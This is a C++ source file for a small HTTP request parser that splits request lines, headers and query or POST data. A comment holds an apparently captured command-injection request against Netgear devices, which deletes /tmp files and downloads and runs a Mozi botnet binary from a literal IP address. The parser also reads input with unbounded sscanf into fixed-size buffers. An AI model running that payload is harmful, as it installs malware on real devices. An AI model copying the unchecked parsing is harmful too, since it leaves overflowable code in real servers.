/*************************************************************************
    > File Name: http_parser.cpp
    > Author: hsz
    > Mail:
    > Created Time: Thu 16 Sep 2021 09:20:43 AM CST
 ************************************************************************/

#include "http_parser.h"
#include <log/log.h>
#include <utils/Errors.h>

#define LOG_TAG "HttpPaser"

namespace eular {

HttpParser::HttpParser(const ByteBuffer& httpRequest) :
    HttpParser(String8((const char *)httpRequest.const_data()))
{

}

HttpParser::HttpParser(const String8& httpRequest)
{
   ParserRequest(httpRequest);
}

const HttpParser::HttpRquestMap &HttpParser::ParserRequest(const String8& httpRequest)
{
    int32_t index = httpRequest.find("\r\n");
    if (index < 0) {
        return mHttpRequestMap;
    }
    // 请求行
    String8 requestLine(httpRequest.c_str(), index);    // 去掉/r/n的请求行
    char method[16] = {0};
    char url[128] = {0};
    char version[32] = {0};
    sscanf(requestLine.c_str(), "%s %s %s", method, url, version);
    LOGD("method = %s, url = %s, version = %s", method, url, version);
    mMethod = String2HttpMethod(method);
    mVersion = String2HttpVersion(version);
    mUrl = url;
    int32_t prevIndex = index + 2;
    while ((index = httpRequest.find("\r\n", prevIndex)) > 0) {
        String8 line = String8(httpRequest.c_str() + prevIndex, index - prevIndex);
        // LOGD("one line of http request: %s", line.c_str());
        int32_t colonPos = line.find(':');
        if (colonPos > 0) {
            String8 key(line.c_str(), colonPos);
            String8 val(line.c_str() + colonPos + 2);
            LOGD("key[%s], val[%s]", key.c_str(), val.c_str());
            mHttpRequestMap.emplace(std::make_pair(key, val));
        } else { // 到达末尾\r\n
            index += 2;
            break;
        }
        prevIndex = index + 2;  // 下一行起点
    }

    int32_t queMarkPos;
    switch (mMethod)
    {
    case HttpMethod::GET:
        queMarkPos =  String8::kmp_strstr(url, "?"); // ?的位置
        if (queMarkPos > 0) {
            mRequestData.set((const uint8_t *)url + queMarkPos + 1, strlen(url + queMarkPos + 1));
            mUrl = String8(url, queMarkPos);
            LOGD("url reset to %s", mUrl.c_str());
        }
        break;
    case HttpMethod::POST:
        mRequestData.set((const uint8_t *)httpRequest.c_str() + index, httpRequest.length() - index);
        LOGD("POST data: [\"%s\"]", mRequestData.data());
        break;
    case HttpMethod::PUT:
        break;
    default:
        LOGW("unknow method: %s", method);
        break;
    }
    ParserRequestData();
    return mHttpRequestMap;
}

// next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;
// wget+http://61.54.223.119:48782/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
bool HttpParser::ParserRequestData()
{
    if (mRequestData.size() == 0) {
        return true;
    }
    int32_t pos = 0;
    int32_t prevPos = 0;
    String8 requestData = (const char *)mRequestData.const_data();

    while ((pos = requestData.find('&', prevPos)) > 0) {
        String8 keyValue = String8(requestData.c_str() + prevPos, pos - prevPos);
        int32_t equalPos = keyValue.find('=');
        if (equalPos > 0) {
            mRequestDataMap[String8(keyValue.c_str(), equalPos)] = String8(keyValue.c_str() + equalPos + 1);
        }
        prevPos = pos + 1;
    }

    String8 keyValue(requestData.c_str() + prevPos);    // 最后一个键值对
    int32_t equalPos = keyValue.find('=');
    if (equalPos > 0) {
        mRequestDataMap[String8(keyValue.c_str(), equalPos)] = String8(keyValue.c_str() + equalPos + 1);
    }

    for (const auto &it : mRequestDataMap) {
        LOGD("%s() [\"%s\",\"%s\"]", __func__, it.first.c_str(), it.second.c_str());
    }
    return true;
}

const String8 &HttpParser::getValueByKey(const String8 &key) const
{
    static String8 ret = "";
    auto it = mRequestDataMap.find(key);
    if (it == mRequestDataMap.end()) {
        return ret;
    }

    return it->second;
}

bool HttpParser::KeepAlive() const
{
    auto it = mHttpRequestMap.find("Connection");
    if (it == mHttpRequestMap.end()) {
        if (mVersion > HttpVersion::HTTPV11) {
            return true;
        }
        return false;
    }

    if (it->second.StrCaseCmp("close") == 0) {
        return false;
    }
    return true;
}

} // namespace eular
